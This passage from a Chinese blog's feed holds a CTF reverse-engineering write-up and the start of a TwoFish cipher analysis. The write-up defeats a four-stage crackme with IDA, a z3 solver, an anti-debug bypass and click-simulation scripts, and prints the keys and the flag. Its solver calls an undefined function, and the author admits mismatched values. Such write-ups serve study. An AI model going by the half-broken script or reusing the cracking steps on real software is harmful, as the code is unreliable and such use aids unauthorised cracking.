    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="反汇编" scheme="https://kabeor.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>2018护网杯线上 APM233</title>
    <link href="https://kabeor.github.io/2018%E6%8A%A4%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%20APM233/"/>
    <id>https://kabeor.github.io/2018%E6%8A%A4%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%20APM233/</id>
    <published>2019-08-01T16:00:00.000Z</published>
    <updated>2020-03-16T04:53:13.907Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2018护网杯线上-APM233"><a href="#2018护网杯线上-APM233" class="headerlink" title="2018护网杯线上 APM233"></a>2018护网杯线上 APM233</h1><p>MFC42的逆向</p><p><a href="https://i.loli.net/2019/07/31/5d4156590c9ba50005.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/31/5d4156590c9ba50005.jpg" class="lazyload"></a></p><p>一共四层验证，IDA打开后基本全红，直接按P创建函数<br>花指令格式为<code>jz address+1;  jnz address+1;</code>,因此显示出address处的opcode，按D设为数据，address+1处创建函数，平衡栈帧即可</p><p>主流程<br><a href="https://i.loli.net/2019/07/31/5d41579664ffd31971.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/31/5d41579664ffd31971.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2019/07/31/5d4157b6c3bce90900.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/31/5d4157b6c3bce90900.jpg" class="lazyload"></a></p><h2 id="Check1"><a href="#Check1" class="headerlink" title="Check1"></a>Check1</h2><p>第一层与字符串1d2e3c4a比较</p><h2 id="Check2"><a href="#Check2" class="headerlink" title="Check2"></a>Check2</h2><p><a href="https://i.loli.net/2019/07/31/5d415857c43ac44867.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/31/5d415857c43ac44867.jpg" class="lazyload"></a></p><p>z3直接计算</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">from z3 <span class="keyword">import</span> *</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">Dr0 = BitVec('Dr0',32)</span><br><span class="line">Dr1 = BitVec('Dr1',32)</span><br><span class="line">Dr2 = BitVec('Dr2',32)</span><br><span class="line">Dr3 = BitVec('Dr3',32)</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(Dr0 &lt;= <span class="number">0x7FFFFFFF</span>)</span><br><span class="line">s.add(Dr1 &lt;= <span class="number">0x7FFFFFFF</span>)</span><br><span class="line">s.add(Dr2 &lt;= <span class="number">0x7FFFFFFF</span>)</span><br><span class="line">s.add(Dr3 &lt;= <span class="number">0x7FFFFFFF</span>)</span><br><span class="line">s.add(Dr1+Dr0 == <span class="number">0x899a9d9c</span>)</span><br><span class="line">s.add(Dr2+Dr1 == <span class="number">0x384989ED</span>)</span><br><span class="line">s.add(Dr3+Dr2 == <span class="number">0x2B2C85BC</span>)</span><br><span class="line">s.add(Dr0-Dr3 == <span class="number">0xAFAFDC11</span>)</span><br><span class="line"></span><br><span class="line">s.check()    </span><br><span class="line"></span><br><span class="line">m = s.model() </span><br><span class="line"></span><br><span class="line">Dr0 = int('%s'%m[Dr0])</span><br><span class="line">Dr1 = int('%s'%m[Dr1])</span><br><span class="line">Dr2 = int('%s'%m[Dr2])</span><br><span class="line">Dr3 = int('%s'%m[Dr3])</span><br><span class="line">    </span><br><span class="line">ans = '%s%s%s%s'%(p32(Dr0).encode('hex'),p32(Dr1).encode('hex'),p32(Dr2).encode('hex'),p32(Dr3).encode('hex'))</span><br><span class="line"></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure></div><p>不知道为什么我这里的数值和别人的不一样，算出来的也不一样。。。正确结果应该是efbe3323adde6666feca1313beba1414</p><h2 id="Check3"><a href="#Check3" class="headerlink" title="Check3"></a>Check3</h2><p>各种反调试虚拟机检测，未检测到的返回值就是key：    0acb7935481efc12<br><a href="https://i.loli.net/2019/07/31/5d4158ff4387664889.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/31/5d4158ff4387664889.jpg" class="lazyload"></a></p><h2 id="Check4"><a href="#Check4" class="headerlink" title="Check4"></a>Check4</h2><p><a href="https://i.loli.net/2019/07/31/5d415a2bef10158583.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/31/5d415a2bef10158583.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2019/07/31/5d415a3fd47ee42987.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/31/5d415a3fd47ee42987.jpg" class="lazyload"></a></p><p>要求玩家的位置不能与三个AI重合，玩家每次的可走的步数为1-4，AI的行动路线如下所示<br><code>a1 = [4, -1, 6, -1, 3, 2, 4, 1, 3, -1, 5, 1, 2, -1, 5, 1, 3, -2, 7, 0, 2, 3, 5, 0, 5, 0, 5, 2, 1, -2, 6, -1, 3, 3, 4, 0, 5, -1, 6, 0, 4, 0, 7, 0, 5, -2, 7, 2, 2, -1, 6, 2, 2, 1, 5, 0, 2, 0, 3, 0, 4, 0, 6, -1, 5, 0, 5, 3, 0, 5, 3, 2]</code><br><code>a2 = [2, 2, 3, 3, 3, -2, 7, 1, 1, 1, 5, 1, 0, 2, 5, 1, 0, 0, 4, 0, 7, 2, 2, 0, 4, 1, 3, 4, 0, 1, 6, -1, 5, -1, 3, 5, 1, 2, 5, 0, 5, 0, 2, 5, 1, 1, 5, 2, 2, 1, 2, 3, 5, -1, 4, 1, 2, -1, 7, 1, 2, 2, 1, 2, 5, 0, 5, 0, 5, -1, 3, 2]</code><br><code>a3 = [3, -1, 6, -1, 5, 0, 4, 0, 2, 5, 0, 5, 1, -1, 5, 1, 0, 2, 4, 0, 5, 0, 4, 0, 6, -1, 6, 1, 2, 1, 3, 3, 2, 3, 3, 0, 5, -1, 4, 0, 6, 0, 5, 0, 5, 1, 2, 2, 3, 0, 5, 5, 0, 0, 6, 2, -1, 1, 5, 1, 0, 3, 4, -1, 4, 5, 0, 2, 5, 1, 4, 1]</code><br>通过上述规则，可以得到玩家的路线为<br><code>[1, 4, 1, 3, 1, 4, 1, 2, 2, 3, 2, 1, 1, 4, 1, 1, 1, 4, 1, 4, 2, 3, 1, 4, 1, 4, 2, 1, 1, 4, 1, 3, 2, 3, 2, 3, 1, 4, 1, 4, 1, 4, 2, 3, 1, 4, 2, 2, 1, 4, 3, 2, 1, 4, 1, 1, 1, 4, 1, 2, 2, 3, 1, 4, 2, 3, 2, 3, 2, 3, 2, 3]</code><br>玩家的行动由输入b64encode后再将编码后的结果拆为两两一组</p><p>脚本</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode,b64encode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level4</span><span class="params">()</span>:</span></span><br><span class="line">    a1 = [<span class="number">4</span>, <span class="number">-1</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">-2</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">-2</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">-2</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">-1</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>]</span><br><span class="line">    a2 = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">-2</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">-1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">2</span>]</span><br><span class="line">    a3 = [<span class="number">3</span>, <span class="number">-1</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">-1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    pos1 = <span class="number">0</span></span><br><span class="line">    pos2 = <span class="number">0</span></span><br><span class="line">    pos3 = <span class="number">0</span></span><br><span class="line">    pos4 = <span class="number">0</span></span><br><span class="line">    choice = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a1)):</span><br><span class="line">        pos1 += a1[i]</span><br><span class="line">        pos2 += a2[i]</span><br><span class="line">        pos3 += a3[i]</span><br><span class="line">        <span class="keyword">if</span> (pos4 + <span class="number">4</span> != pos1) <span class="keyword">and</span> (pos4 + <span class="number">4</span> != pos2) <span class="keyword">and</span> (pos4 + <span class="number">4</span> != pos3):</span><br><span class="line">            t = <span class="number">4</span></span><br><span class="line">        <span class="keyword">elif</span> (pos4 + <span class="number">3</span> != pos1) <span class="keyword">and</span> (pos4 + <span class="number">3</span> != pos2) <span class="keyword">and</span> (pos4 + <span class="number">3</span> != pos3):</span><br><span class="line">            t = <span class="number">3</span></span><br><span class="line">        <span class="keyword">elif</span> (pos4 + <span class="number">2</span> != pos1) <span class="keyword">and</span> (pos4 + <span class="number">2</span> != pos2) <span class="keyword">and</span> (pos4 + <span class="number">2</span> != pos3):</span><br><span class="line">            t = <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t = <span class="number">1</span></span><br><span class="line">        pos4 += t</span><br><span class="line">        choice.append(t<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> choice</span><br><span class="line"></span><br><span class="line">    b64 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> choice</span><br><span class="line">    ans = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(choice),<span class="number">3</span>):</span><br><span class="line">        t = (choice[i]&lt;&lt;<span class="number">4</span>) + (choice[i+<span class="number">1</span>]&lt;&lt;<span class="number">2</span>) + choice[i+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">print</span> t,</span><br><span class="line">        ans+=b64[t]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> ans</span><br><span class="line">    <span class="keyword">print</span> b64decode(ans)</span><br><span class="line"></span><br><span class="line"><span class="comment"># level1 1d2e3c4a</span></span><br><span class="line">level2()    <span class="comment"># efbe3323adde6666feca1313beba1414</span></span><br><span class="line"><span class="comment"># level3 0acb7935481efc12</span></span><br><span class="line">level4()    <span class="comment"># 21d03c42f365901cff</span></span><br></pre></td></tr></table></figure></div><p>程序输入有时间限制，可以找到时间call直接jmp，也可以鼠标模拟</p><p>鼠标点击模拟脚本</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pymouse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">m = PyMouse()</span><br><span class="line"></span><br><span class="line">k1 = <span class="string">"1d2e3c4a"</span></span><br><span class="line">key1 = list(k1)</span><br><span class="line">k2 = <span class="string">"efbe3323adde6666feca1313beba1414"</span></span><br><span class="line">key2 = list(k2)</span><br><span class="line">k3 = <span class="string">"0acb7935481efc12"</span></span><br><span class="line">key3 = list(k3)</span><br><span class="line">k4 = <span class="string">"21d03c42f365901cff"</span></span><br><span class="line">key4 = list(k4)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mnclick</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(y):</span><br><span class="line">        <span class="keyword">if</span>(x[i] == <span class="string">'0'</span>): m.click(<span class="number">1075</span>, <span class="number">418</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'1'</span>): m.click(<span class="number">1118</span>, <span class="number">418</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'2'</span>): m.click(<span class="number">1162</span>, <span class="number">418</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'3'</span>): m.click(<span class="number">1205</span>, <span class="number">418</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'4'</span>): m.click(<span class="number">1075</span>, <span class="number">465</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'5'</span>): m.click(<span class="number">1118</span>, <span class="number">465</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'6'</span>): m.click(<span class="number">1162</span>, <span class="number">465</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'7'</span>): m.click(<span class="number">1205</span>, <span class="number">465</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'8'</span>): m.click(<span class="number">1075</span>, <span class="number">511</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'9'</span>): m.click(<span class="number">1118</span>, <span class="number">511</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'a'</span>): m.click(<span class="number">1162</span>, <span class="number">511</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'b'</span>): m.click(<span class="number">1205</span>, <span class="number">511</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'c'</span>): m.click(<span class="number">1075</span>, <span class="number">558</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'d'</span>): m.click(<span class="number">1118</span>, <span class="number">558</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'e'</span>): m.click(<span class="number">1162</span>, <span class="number">558</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'f'</span>): m.click(<span class="number">1205</span>, <span class="number">558</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    m.click(<span class="number">670</span>, <span class="number">624</span>)</span><br><span class="line"></span><br><span class="line">mnclick(key1, <span class="number">8</span>)</span><br><span class="line">mnclick(key2, <span class="number">32</span>)</span><br><span class="line">mnclick(key3, <span class="number">16</span>)</span><br><span class="line">mnclick(key4, <span class="number">18</span>)</span><br></pre></td></tr></table></figure></div><p>按钮位置是用spy++查看窗口属性看到的</p><p>最后   flag{N0t_d1ff1cul7_r1ght?_3d34e}</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;2018护网杯线上-APM233&quot;&gt;&lt;a href=&quot;#2018护网杯线上-APM233&quot; class=&quot;headerlink&quot; title=&quot;2018护网杯线上 APM233&quot;&gt;&lt;/a&gt;2018护网杯线上</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向， CTF" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C-CTF/"/>
    
  </entry>
  
  <entry>
    <title>逆向分析加解密之TwoFish算法</title>
    <link href="https://kabeor.github.io/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%B9%8BTwoFish%E7%AE%97%E6%B3%95/"/>
    <id>https://kabeor.github.io/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%B9%8BTwoFish%E7%AE%97%E6%B3%95/</id>
    <published>2019-08-01T16:00:00.000Z</published>
    <updated>2020-03-16T04:34:31.459Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向分析加解密之TwoFish算法"><a href="#逆向分析加解密之TwoFish算法" class="headerlink" title="逆向分析加解密之TwoFish算法"></a>逆向分析加解密之TwoFish算法</h1><blockquote><p>本文由本人首发于先知社区 <a href="https://xz.aliyun.com/t/5807" target="_blank" rel="noopener">https://xz.aliyun.com/t/5807</a></p></blockquote><p>前几天某师傅给我发来一个逆向题，拿来分析发现竟是AES决赛算法之一的TwoFish算法，之前网上对此算法的逆向分析竟然一个都没有，对算法的介绍也只有寥寥数语，于是想准备在这里与大家分享对该算法的逆向分析以及CTF中此算法的变体。</p><h2 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h2><p>官方有一个68页的pdf，有兴趣可以看一下<br><a href="http://www.schneier.com/twofish-analysis-shiho.pdf" target="_blank" rel="noopener">http://www.schneier.com/twofish-analysis-shiho.pdf</a></p><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><a href="https://i.loli.net/2019/07/25/5d391b311e84491804.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d391b311e84491804.jpg" class="lazyload"></a></p><p>TwoFish的意思应该就是这样交叉运算的形状吧</p><h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><p>TwoFish加密需要明文(plain)和密钥(key)<br>总的来说进行一次加解密可分为三个环节</p><ol><li>Input whitening</li><li>16次循环</li><li>Output whitening</li></ol><h4 id="Input-whitening"><a href="#Input-whitening" class="headerlink" title="Input whitening"></a>Input whitening</h4><blockquote><ol><li>拓展密钥</li></ol></blockquote><p>在Twofish 算法中，规定密钥的长度 N = 128, N = 192, N = 256三种。也就是说密钥的长度可以在128-bit ~ 256-bit之间变化。</p><p>我们需要产生40个与密钥相关的K(i)，这里的K(i)是根据密钥算出来的32-bit数据<br>除此以外，我们还需要4个与密钥相关的S-box，也就是s(i)()。</p><p>为计算K和S，定义MDS矩阵</p><p><a href="https://i.loli.net/2019/07/25/5d392304b308519968.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d392304b308519968.jpg" class="lazyload"></a> </p><p>且对于MDS 矩阵，有限域GF的定义如下：<br><code>GF(2^8) ≡ GF(2)(x)/v(x)，其中v(x) = x^8 + x^6 + x^5 + x^3 + 1</code>   </p><p>此外还需要h函数</p><pre><code> y(k,j) = x(j)                     j = 0, ... ,3如果：k == 4    y(3,0) = q1[y(4,0)] xor l(3,0)    y(3,1) = q0[y(4,1)] xor l(3,1)    y(3,2) = q0[y(4,2)] xor l(3,2)    y(3,3) = q1[y(4,3)] xor l(3,3)如果：k &gt;= 3    y(2,0) = q1[y(3,0)] xor l(2,0)    y(2,1) = q1[y(3,1)] xor l(2,1)    y(2,2) = q0[y(3,2)] xor l(2,2)    y(2,3) = q0[y(3,3)] xor l(3,3)对于所有情况：    y0 = q1[q0[q0[y(2,0)] xor l(1,0)] xor l(0,0)]    y1 = q0[q0[q1[y(2,1)] xor l(1,1)] xor l(0,1)]    y2 = q1[q1[q0[y(2,2)] xor l(1,2)] xor l(0,2)]    y3 = q0[q1[q1[y(2,3)] xor l(1,3)] xor l(0,3)]</code></pre><p>实现代码稍后来说</p><blockquote><ol start="2"><li>输入白化</li></ol></blockquote><p>因为加密前的plain text是128 bits，也就是16 bytes。假设这16 bytes分别是p0, … ,p15。将p0, … ,p15分为4组：<br><code>P(i) = ∑p(4i+j)2^(8j)，其中i,j = 0, ... ,3</code></p><p>然后进行运算<code>R(0,i) = P(i) xor K(i)，其中i = 0, ... ,3</code></p><h4 id="16次运算"><a href="#16次运算" class="headerlink" title="16次运算"></a>16次运算</h4><p>将以下公式循环16次</p><pre><code>(F(r,0), F(r,1)) = F(R(r,0), R(r,1), r) R(r+1,0) = ROR(R(r,2) xor F(r,0), 1) R(r+1,1) = ROL(R(r,3), 1) xor F(r,1) R(r+1,2) = R(r,0) R(r+1,3) = R(r,1)</code></pre><p>其中，F函数为以下操作</p><pre><code>t0 = g(r0)t1 = rol(r1, 8)t1 = g(t1)o = 2*rF0 = (T0 +  T1 + K(2r+8)) mod 2^32F1 = (T0 + 2T1 + K(2r+9)) mod 2^32</code></pre><p>其中g函数为核心函数</p><pre><code>x(i) = [X/2^(8i)] mod 2^8  其中i = 0, ... ,3y(i) = s(i)(x(i))       其中i = 0, ... ,3</code></pre><p><a href="https://i.loli.net/2019/07/25/5d392756d7d6492028.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d392756d7d6492028.jpg" class="lazyload"></a> </p><pre><code>Z = ∑z(i)2^(8i)，其中i = 0, ... ,3</code></pre><h4 id="输出白化"><a href="#输出白化" class="headerlink" title="输出白化"></a>输出白化</h4><pre><code>C(i) = R(16,(i+2) mod 4) xor K(i+4)，其中i = 0, ... ,3</code></pre><p>最后计算组成密文</p><pre><code>c(i) = [C(i/4) / 2^(8(i mod 4))] mod 2^8，其中i = 0, ... ,15</code></pre><p>下面来逆向分析看一下实际实现吧</p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>拿到题后PEID分析<br><a href="https://i.loli.net/2019/07/25/5d392ac4cd3a266075.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d392ac4cd3a266075.jpg" class="lazyload"></a><br>分析到了TwoFish算法</p><p>IDA分析一下，进入主函数看到流程<br><a href="https://i.loli.net/2019/07/25/5d392b24602bc32573.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d392b24602bc32573.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2019/07/25/5d392b4b3d71797118.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d392b4b3d71797118.jpg" class="lazyload"></a></p><p>发现有五个选项，选项名字在sub_402FDA中</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_402FDA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to jiami jiemi game go.go.go."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1._jiemi_(admin only)"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2._jiami_"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3._jiemi__flag(admin only)"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4.exit"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"5._yanzheng__"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>只有选项2和5可用，即加密和验证flag</p><p>进入验证函数sub_40302B查看<br><a href="https://i.loli.net/2019/07/25/5d392c3cbd53454896.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/25/5d392c3cbd53454896.jpg" class="lazyload"></a></p><p>这里我已经注释出密文和key，因此我们只需要解密即可，但只用标准解密算法就可以吗？我们来验证一下</p><p>很明显加密函数为sub_402E5D(&amp;key, plain, &amp;v3);  参数v3传出密钥</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">_BYTE *__cdecl <span class="title">sub_402E5D</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v3; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v3 = sub_401570(a1, <span class="number">128u</span>);                    <span class="comment">// a1 = key   密钥生成k和s</span></span><br><span class="line">  sub_401626(v3, a2, a3);                          <span class="comment">//输入白化，循环，输出白化</span></span><br><span class="line">  <span class="keyword">return</span> sub_401626(v3, (a2 + <span class="number">16</span>), a3 + <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>下面来结合标准实现分析</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_401570</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v2; <span class="comment">// ST1C_4</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST14_4</span></span><br><span 